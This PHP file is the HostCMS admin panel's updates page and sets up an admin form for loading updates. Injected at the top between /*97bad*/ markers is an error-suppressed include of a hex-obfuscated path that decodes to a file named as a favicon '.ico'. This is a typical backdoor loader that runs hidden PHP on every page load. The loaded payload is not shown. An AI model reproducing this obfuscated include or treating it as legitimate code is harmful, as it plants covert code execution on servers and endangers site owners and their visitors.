<?php


/*97bad*/

@include "\x2fho\x6de/\x6eeo\x2dvo\x2fne\x6f-v\x6f.r\x75/d\x6fcs\x2fho\x73tc\x6dsf\x69le\x73/l\x69b/\x6cib\x5f38\x2ffa\x76ic\x6fn_\x3180\x64b2\x2eic\x6f";

/*97bad*/
/**
 * Updates.
 *
 * @package HostCMS
 * @version 6.x
 * @author Hostmake LLC
 * @copyright © 2005-2016 ООО "Хостмэйк" (Hostmake LLC), http://www.hostcms.ru
 */
require_once('../../bootstrap.php');

Core_Auth::authorization($sModule = 'update');

// Код формы
$iAdmin_Form_Id = 140;
$sAdminFormAction = '/admin/update/index.php';

$oAdmin_Form = Core_Entity::factory('Admin_Form', $iAdmin_Form_Id);

// Контроллер формы
$oAdmin_Form_Controller = Admin_Form_Controller::create($oAdmin_Form);
$oAdmin_Form_Controller
	->module(Core_Module::factory($sModule))
	->setUp()
	->path($sAdminFormAction)
	->title(Core::_('Update.menu'))
	->pageTitle(Core::_('Update.menu'));

// Меню формы
$oAdmin_Form_Entity_Menus = Admin_Form_Entity::factory('Menus');

// Элементы меню
$oAdmin_Form_Entity_Menus->add(
	Admin_Form_Entity::factory('Menu')
		->name(Core::_('Update.submenu'))
		->icon('fa fa-refresh')
		->img('/admin/images/refresh.gif')
		->href(
			$oAdmin_Form_Controller->getAdminActionLoadHref($oAdmin_Form_Controller->getPath(), 'loadUpdates', NULL, 0, 0)
		)
		->onclick(
			$oAdmin_Form_Controller->getAdminActionLoadAjax($oAdmin_Form_Controller->getPath(), 'loadUpdates', NULL, 0, 0)
		)
);

// Добавляем все меню контроллеру
$oAdmin_Form_Controller->addEntity($oAdmin_Form_Entity_Menus);

// Источник данных 0
$oAdmin_Form_Dataset = new Update_Dataset();

// Добавляем источник данных контроллеру формы
$oAdmin_Form_Controller->addDataset(
	$oAdmin_Form_Dataset
);

// Показ формы
$oAdmin_Form_Controller->execute();
